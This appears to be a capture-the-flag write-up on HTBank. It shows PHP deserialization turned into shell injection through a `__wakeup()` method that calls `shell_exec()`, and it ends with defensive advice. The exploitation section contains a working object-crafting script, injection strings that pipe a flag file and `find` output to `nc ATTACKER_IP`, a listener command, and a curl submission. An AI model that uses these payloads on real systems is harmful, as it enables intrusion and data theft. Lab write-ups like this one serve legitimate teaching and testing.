# RCE via Magic Methods (PHP Deserialization)

## Overview

PHP magic methods like `__wakeup()` and `__destruct()` execute automatically during deserialization. If user-controlled input reaches `unserialize()` and the target class has a dangerous magic method, arbitrary code execution is possible without any gadget chain.

## The Vulnerability

In HTBank, `UserSettings::__wakeup()` logs an audit entry using `shell_exec()`:

```php
public function __wakeup() {
    shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
}
```

The `Name` property is concatenated directly into the shell command without sanitization. Any value starting with `";` breaks out of the `echo` and injects arbitrary shell commands.

The `/settings-ie` endpoint deserializes user-supplied data:

```php
$userSettings = unserialize(base64_decode($request['settings']));
```

## Exploitation

### 1. Craft the malicious object

Replicate the class locally (same namespace, same property names), set Name to the injection string:

```php
namespace App\Helpers;

class UserSettings {
    private $Name;
    private $Email;
    private $Password;
    private $ProfilePic;
    // ... getters/setters ...
    public function __sleep() {
        return array("Name", "Email", "Password", "ProfilePic");
    }
}

$payload = new UserSettings(
    '"; cat /var/www/htbank/flag.txt | nc ATTACKER_IP 9001; #',
    'attacker@htbank.com',
    '$2y$10$<any_valid_bcrypt_hash>',
    'default.jpg'
);

echo base64_encode(serialize($payload));
```

The injected shell command breaks out of `echo`:
```
echo "... user '"; cat /var/www/htbank/flag.txt | nc ATTACKER 9001; #'" >> /tmp/htbank.log
```

### 2. Set up listener and submit

```bash
nc -nlvp 9001

# Submit via authenticated POST
curl -s -b cookies.txt -X POST http://TARGET/settings-ie \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=<CSRF>" \
  --data-urlencode "import=1" \
  --data-urlencode "settings=<base64_payload>"
```

## Finding the Flag Path

If the flag isn't at `/flag.txt`, use a find payload first:

```
find / -maxdepth 5 -name "flag.txt" 2>/dev/null | nc ATTACKER 9001
```

## Key Points

- **No gadget chain needed** when the target class itself has a dangerous magic method
- The `__sleep()` method must return the property names so they're included in the serialized output
- PHP private properties serialize with a null-byte prefix: `\x00ClassName\x00PropertyName` — the local class must match the namespace exactly
- `shell_exec()` blocks until the spawned process exits — curl will timeout, but the data is already received by the listener
- Laravel registration does not auto-login; you must POST `/login` explicitly after registering to get an authenticated session

## Magic Methods Relevant to Deserialization

| Method | Trigger |
|--------|---------|
| `__wakeup` | Called on `unserialize()` |
| `__unserialize` | Called on `unserialize()` (PHP 7.4+, takes priority over `__wakeup`) |
| `__destruct` | Called when object goes out of scope (after deserialization completes) |
| `__toString` | Called when object is used as a string (e.g. `echo $obj`) |

## Defense

- Never pass user-controlled data to `unserialize()`
- Use `unserialize($data, ['allowed_classes' => false])` to block object instantiation entirely if only arrays/scalars are needed
- If objects are required, use `['allowed_classes' => ['AllowedClass']]` allowlist
- Avoid dangerous operations (`shell_exec`, `system`, file writes) inside magic methods
